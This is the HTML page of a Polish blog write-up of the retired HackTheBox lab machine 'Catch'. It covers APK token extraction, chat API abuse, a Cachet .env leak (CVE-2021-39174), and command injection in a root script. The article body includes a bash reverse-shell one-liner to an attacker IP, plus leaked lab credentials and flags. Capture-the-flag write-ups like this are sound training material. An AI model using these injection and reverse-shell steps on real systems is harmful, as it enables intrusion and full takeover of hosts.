@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Catch - HackTheBox | Mateusz Suszczyk</title>
+<meta name="keywords" content="Linux, Medium, Retired" />
+<meta name="description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)">
+<meta name="author" content="Mateusz Suszczyk">
+<link rel="canonical" href="https://suszczyk.github.io/posts/hackthebox/catch/" />
+<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://suszczyk.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://suszczyk.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://suszczyk.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://suszczyk.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://suszczyk.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.92.2" />
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Catch - HackTheBox" />
+<meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://suszczyk.github.io/posts/hackthebox/catch/" />
+<meta property="og:image" content="https://suszczyk.github.io/thumbnails/Catch.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-29T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-07-29T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/Catch.png" />
+<meta name="twitter:title" content="Catch - HackTheBox"/>
+<meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://suszczyk.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Catch - HackTheBox",
+      "item": "https://suszczyk.github.io/posts/hackthebox/catch/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Catch - HackTheBox",
+  "name": "Catch - HackTheBox",
+  "description": "Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup\u0026rsquo;em :)",
+  "keywords": [
+    "Linux", "Medium", "Retired"
+  ],
+  "articleBody": "Catch - 29.07.2022  NMap ┌[parrot@parrot]─[~/htb/catch] └╼[★ ]$nmap -sC -sV 10.10.11.150 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-26 23:59 CEST Nmap scan report for 10.10.11.150 Host is up (0.058s latency). Not shown: 995 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Catch Global Systems |_http-server-header: Apache/2.4.41 (Ubuntu) 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Set-Cookie: i_like_gitea=e60c248790972c27; Path=/; HttpOnly | Set-Cookie: _csrf=41kS10x_QcKrZfK2ZvsEbZowL2o6MTY1ODg3MzU5NTczNzc1Mjg4NA; Path=/; Expires=Wed, 27 Jul 2022 22:13:15 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Tue, 26 Jul 2022 22:13:15 GMT | | =\"en-US\" class=\"theme-\" | =\"\" | =\"utf-8\" | =\"viewport\" content=\"width=device-width, initial-scale=1\" | =\"x-ua-compatible\" content=\"ie=edge\" |  Catch Repositories  | =\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz\" | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Set-Cookie: i_like_gitea=4fd37b7163f8237e; Path=/; HttpOnly | Set-Cookie: _csrf=7s0raKa3foKwrWIHYinDybDpmhA6MTY1ODg3MzYwMTU0NzE5MzU1Mg; Path=/; Expires=Wed, 27 Jul 2022 22:13:21 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Tue, 26 Jul 2022 22:13:21 GMT |_ Content-Length: 0 5000/tcp open upnp? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 302 Found | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Location: /login | Vary: Accept, Accept-Encoding | Content-Type: text/plain; charset=utf-8 | Content-Length: 28 | Set-Cookie: connect.sid=s%3AL1AZnkW1AQEa9HvnAHCX55B9tBVAioiX.iGHnhVQ72dbMKiYsuukGBXvh7kh7V6QPkqz199Nxfps; Path=/; HttpOnly | Date: Tue, 26 Jul 2022 22:13:20 GMT | Connection: close | Found. Redirecting to /login | HTTPOptions: | HTTP/1.1 200 OK | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Allow: GET,HEAD | Content-Type: text/html; charset=utf-8 | Content-Length: 8 | ETag: W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\" | Set-Cookie: connect.sid=s%3AzSDw9ojr5hWmduJFErbcZTwXFOj6Wuz3.us2lDTLK%2BUW7AHErGSarzAoGhukim%2BdQaIJ7RXJGY2c; Path=/; HttpOnly | Vary: Accept-Encoding | Date: Tue, 26 Jul 2022 22:13:21 GMT | Connection: close |_ GET,HEAD 8000/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Catch Global Systems |_http-server-header: Apache/2.4.29 (Ubuntu)  Feroxbuster Na tej maszynie mamy wiele otwartych portów z HTTP. Jednak Feroxbuster nie znalazł dla żadnej z nich żadnych konkretnych informacji.\n Strona główna (port 80) Nic konkretnego nie ma na tej stronie, poza małym szczegółem. Pomarańczowym przyciskiem Download Now możemy pobrać pliczek .apk. Kiedyś bawiłem się w różne CTFy i mam już pewne obycie co należy robić i gdzie szukać w apce mobilnej. Zabrałem się za narzędzia jadx oraz apktool. Jeszcze tylko wspomnę, że na porcie 3000 mamy Gitea 1.14.1.\nNa porcie 5000 jest usługa Lets Chat.\nA na porcie 8000 mamy Cachet.\n jadx W głównej funkcji znalazłem ciekawy odnośnik do https://status.catch.htb, zatem od razu dodaję do /etc/hosts wpisy catch.htb status.catch.htb. Znalazłem również w /res/values/strings.xml ciekawe tokeny. Pokrywają się one z tym, co mamy na poszczególnych portach.\nSpis wszystkich tokenów:\nb87bfb6345ae72ed5ecdcee05bcb34c83806fbd0 NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ== xoxp-23984754863-2348975623103  Token od Gitea nie chciał działać poprawnie więc przeszedłem do kolejnej usługi, czyli do Lets Chat.\nlets_chat_token Token jest w formie Base64. Deszyfrowanie go nie daje żadnych konkretnych informacji.\nNjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\nNie wiedziałem, jak należy użyć Bearer Token, ale po szybkim wygooglowaniu znalazłem informacje.\nZatem mamy zapytanie poprzez curl.\n┌[parrot@parrot]─[~/htb/catch] └╼[★ ]$curl http://catch.htb:5000/rooms -H \"Accept: application/json\" -H \"Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNT dmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" [{\"id\":\"61b86b28d984e2451036eb17\",\"slug\":\"status\",\"name\":\"Status\",\"description\":\"Cachet Updates and Maintenance\",\"lastActive\":\"2021-12-14T10:34:20.749Z\",\"crea ted\":\"2021-12-14T10:00:08.384Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]},{\"id\":\"61b8708efe190b466d476bfb\",\"sl ug\":\"android_dev\",\"name\":\"Android Development\",\"description\":\"Android App Updates, Issues \u0026 More\",\"lastActive\":\"2021-12-14T10:24:21.145Z\",\"created\":\"2021-12-1 4T10:23:10.474Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]},{\"id\":\"61b86b3fd984e2451036eb18\",\"slug\":\"employees\" ,\"name\":\"Employees\",\"description\":\"New Joinees, Org updates\",\"lastActive\":\"2021-12-14T10:18:04.710Z\",\"created\":\"2021-12-14T10:00:31.043Z\",\"owner\":\"61b86aead98 4e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]}] Dla wygody warto użyć jq, który przedstawi output w czytelnej formie.\n┌[parrot@parrot]─[~/htb/catch] └╼[★ ]$curl http://catch.htb:5000/rooms -s -H \"Accept: application/json\" -H \"Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" | jq . [ { \"id\": \"61b86b28d984e2451036eb17\", \"slug\": \"status\", \"name\": \"Status\", \"description\": \"Cachet Updates and Maintenance\", \"lastActive\": \"2021-12-14T10:34:20.749Z\", \"created\": \"2021-12-14T10:00:08.384Z\", \"owner\": \"61b86aead984e2451036eb16\", \"private\": false, \"hasPassword\": false, \"participants\": [] }, { \"id\": \"61b8708efe190b466d476bfb\", \"slug\": \"android_dev\", \"name\": \"Android Development\", \"description\": \"Android App Updates, Issues \u0026 More\", \"lastActive\": \"2021-12-14T10:24:21.145Z\", \"created\": \"2021-12-14T10:23:10.474Z\", \"owner\": \"61b86aead984e2451036eb16\", \"private\": false, \"hasPassword\": false, \"participants\": [] }, { \"id\": \"61b86b3fd984e2451036eb18\", \"slug\": \"employees\", \"name\": \"Employees\", \"description\": \"New Joinees, Org updates\", \"lastActive\": \"2021-12-14T10:18:04.710Z\", \"created\": \"2021-12-14T10:00:31.043Z\", \"owner\": \"61b86aead984e2451036eb16\", \"private\": false, \"hasPassword\": false, \"participants\": [] } ] Mamy również użytkowników - admin, john, will, lucas\n┌[parrot@parrot]─[~/htb/catch] └╼[★ ]$curl -s http://catch.htb:5000/users -H \"Accept: application/json\" -H \"Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" | jq . [ { \"id\": \"61b86aead984e2451036eb16\", \"firstName\": \"Administrator\", \"lastName\": \"NA\", \"username\": \"admin\", \"displayName\": \"Admin\", \"avatar\": \"e2b5310ec47bba317c5f1b5889e96f04\", \"openRooms\": [ \"61b86b28d984e2451036eb17\", \"61b86b3fd984e2451036eb18\", \"61b8708efe190b466d476bfb\" ] }, { \"id\": \"61b86dbdfe190b466d476bf0\", \"firstName\": \"John\", \"lastName\": \"Smith\", \"username\": \"john\", \"displayName\": \"John\", \"avatar\": \"f5504305b704452bba9c94e228f271c4\", \"openRooms\": [ \"61b86b3fd984e2451036eb18\", \"61b86b28d984e2451036eb17\" ] }, { \"id\": \"61b86e40fe190b466d476bf2\", \"firstName\": \"Will\", \"lastName\": \"Robinson\", \"username\": \"will\", \"displayName\": \"Will\", \"avatar\": \"7c6143461e935a67981cc292e53c58fc\", \"openRooms\": [ \"61b86b3fd984e2451036eb18\", \"61b86b28d984e2451036eb17\" ] }, { \"id\": \"61b86f15fe190b466d476bf5\", \"firstName\": \"Lucas\", \"lastName\": \"NA\", \"username\": \"lucas\", \"displayName\": \"Lucas\", \"avatar\": \"b36396794553376673623dc0f6dec9bb\", \"openRooms\": [ \"61b86b28d984e2451036eb17\", \"61b86b3fd984e2451036eb18\" ] } ] Zgodnie z Githubem Lets Chat możemy podejrzeć wiadomości w poszczególnych pokojach.\nW jednej z rozmów pojawiają się dane dostępowe do status.catch.htb.\njohn : E}V!mywu_69T4C}W\nUdało się zalogować na Cachet.\nW opcjach widoczna jest wersja 2.4.0-dev Wersja 2.4.0-dev ma trzy podatności. Są one opisane w tym poście https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/. Ja postanowiłem spróbować sił z CVE-2021-39174 czyli z wyciekiem danych konfiguracyjnych z pliku .env. Szczególnie interesowałyby nas te:\nAPP_KEY DB_PASSWORD MAIL_PASSWORD Po wprowadzeniu zmiennych należy zapisać Save.\nA tutaj mamy efekt po odświeżeniu strony. Oto wyciek z pierwszej zmiennej APP_KEY.\nOtrzymałem następujące dane wykorzystując 3 zmienne:\n${APP_KEY} - base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA= ${DB_PASSWORD} - s2#4Fg0_%3! ${MAIL_PASSWORD} - tutaj nic nie otrzymałem Mam hasło, jest to jakiś punkt zaczepienia. Sprawdziłem hasło na SSH dla wszystkich userów, którzy są powyżej.\nUdało się zalogować na usera will 😊\nuser.txt\n960e9c3b788ec10ec267423976478c4c\n Privilege Escalation Nietypowy skrypt w /opt/mdm/verify.sh.\nJak się okazuje, jest to skrypt, który przeprowadza szereg działań na plikach.apk.\nSprawdziłem również pspy64. Co jakiś czas box uruchamia pewien plik.\n2022/07/28 19:30:05 CMD: UID=0 PID=348041 | /bin/bash /root/check.sh Z eskalacją miałem małe zacięcie. Na forum HackTheBox, niektóre osoby wspominały, żeby zacząć sprawdzanie skryptu od końca. Zatem warto spojrzeć na ostatnią funkcję app_check.\nPodatne na Command Injection wydaje się fragment z echo -n $APP_NAME. Należy tylko pamiętać, że trzeba zachować fragment Catch, aby warunek był prawdziwy. Następnie w linii poniżej po echo -n a przed xargs -I ...  możemy umieścić swoje komendy.\nDlatego sprawdziłem, czy box spróbuje pobrać plik test z mojego serwera www.\nAby skrypt działał należy umieścić go w /opt/mdm/apk_bin. Jak się okazało maszyna pobrała mój plik. Zatem przygotowuje reverse shella.\nStworzyłem plik test i umieściłem tam reverse shell bash TCP.\nbash -i \u0026 /dev/tcp/10.10.14.171/9001 0\u00261 Następnie skopiowałem plik do /opt/mdm/apk_bin.\ncp /tmp/p/catch1.0_mod.apk /opt/mdm/apk_bin Po chwili root uruchomił skrypt, a my dostaliśmy połączenie na porcie 9001.\nroot.txt 16ebe688e18abf71cf45d0a2887ec566\n Roof proof ",
+  "wordCount" : "1105",
+  "inLanguage": "en",
+  "image":"https://suszczyk.github.io/thumbnails/Catch.png","datePublished": "2022-07-29T00:00:00Z",
+  "dateModified": "2022-07-29T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mateusz Suszczyk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://suszczyk.github.io/posts/hackthebox/catch/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Mateusz Suszczyk",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://suszczyk.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://suszczyk.github.io" accesskey="h" title="Mateusz Suszczyk (Alt + H)">Mateusz Suszczyk</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://suszczyk.github.io/archives/" title="Archiwum">
+                    <span>Archiwum</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/categories/" title="Kategorie">
+                    <span>Kategorie</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/tags/" title="Tagi">
+                    <span>Tagi</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/search/" title="Szukaj">
+                    <span>Szukaj</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://suszczyk.github.io">Home</a>&nbsp;»&nbsp;<a href="https://suszczyk.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Catch - HackTheBox
+    </h1>
+    <div class="post-meta"><span title='2022-07-29 00:00:00 +0000 UTC'>July 29, 2022</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Mateusz Suszczyk
+
+</div>
+  </header> 
+<figure class="entry-cover"><img loading="lazy" src="https://suszczyk.github.io/thumbnails/Catch.png" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#catch---29072022" aria-label="Catch - 29.07.2022">Catch - 29.07.2022</a></li>
+                <li>
+                    <a href="#nmap" aria-label="NMap">NMap</a></li>
+                <li>
+                    <a href="#feroxbuster" aria-label="Feroxbuster">Feroxbuster</a></li>
+                <li>
+                    <a href="#strona-g%c5%82%c3%b3wna-port-80" aria-label="Strona główna (port 80)">Strona główna (port 80)</a><ul>
+                        
+                <li>
+                    <a href="#jadx" aria-label="jadx">jadx</a></li>
+                <li>
+                    <a href="#lets_chat_token" aria-label="lets_chat_token">lets_chat_token</a></li></ul>
+                </li>
+                <li>
+                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a><ul>
+                        
+                <li>
+                    <a href="#roof-proof" aria-label="Roof proof">Roof proof</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="catch---29072022">Catch - 29.07.2022<a hidden class="anchor" aria-hidden="true" href="#catch---29072022">#</a></h1>
+<hr>
+<h1 id="nmap">NMap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/catch<span style="color:#f92672">]</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$nmap -sC -sV 10.10.11.150                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-26 23:59 CEST                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.150                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+Host is up <span style="color:#f92672">(</span>0.058s latency<span style="color:#f92672">)</span>.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+Not shown: <span style="color:#ae81ff">995</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+PORT     STATE SERVICE VERSION                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+| ssh-hostkey:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+|_http-title: Catch Global Systems                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+3000/tcp open  ppp?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+| fingerprint-strings:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+|   GenericLines, Help, RTSPRequest:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+|     Connection: close                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+|     Request                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+|   GetRequest:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+|     Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>e60c248790972c27; Path<span style="color:#f92672">=</span>/; HttpOnly                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+|     Set-Cookie: _csrf<span style="color:#f92672">=</span>41kS10x_QcKrZfK2ZvsEbZowL2o6MTY1ODg3MzU5NTczNzc1Mjg4NA; Path<span style="color:#f92672">=</span>/; Expires<span style="color:#f92672">=</span>Wed, <span style="color:#ae81ff">27</span> Jul <span style="color:#ae81ff">2022</span> 22:13:15 GMT; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+|     Set-Cookie: macaron_flash<span style="color:#f92672">=</span>; Path<span style="color:#f92672">=</span>/; Max-Age<span style="color:#f92672">=</span>0; HttpOnly                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+|     X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+|     Date: Tue, <span style="color:#ae81ff">26</span> Jul <span style="color:#ae81ff">2022</span> 22:13:15 GMT                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+|     &lt;!DOCTYPE html&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en-US&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-&#34;</span>&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+|     &lt;head data-suburl<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x-ua-compatible&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ie=edge&#34;</span>&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+|     &lt;title&gt; Catch Repositories &lt;/title&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
